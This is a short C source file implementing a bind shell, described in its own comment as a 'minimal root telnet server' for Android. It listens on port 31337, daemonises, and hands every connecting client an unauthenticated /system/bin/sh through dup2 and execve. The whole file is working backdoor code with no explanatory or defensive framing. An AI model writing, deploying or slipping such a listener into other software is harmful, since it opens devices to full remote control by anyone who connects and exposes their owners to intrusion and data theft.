/* minimal root telnet server: listen on :31337, fork, dup2, exec sh */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    int port = argc > 1 ? atoi(argv[1]) : 31337;
    signal(SIGCHLD, SIG_IGN);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(port);
    if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) { perror("bind"); return 1; }
    if (listen(s, 5) < 0) { perror("listen"); return 1; }
    if (daemon(1, 0) < 0) { perror("daemon"); return 1; }
    for (;;) {
        int c = accept(s, NULL, NULL);
        if (c < 0) continue;
        pid_t p = fork();
        if (p == 0) {
            dup2(c, 0); dup2(c, 1); dup2(c, 2);
            close(c); close(s);
            char *env[] = {"PATH=/sbin:/system/sbin:/system/bin:/system/xbin", "HOME=/data", NULL};
            execve("/system/bin/sh", (char*[]){"sh", NULL}, env);
            _exit(1);
        }
        close(c);
    }
    return 0;
}
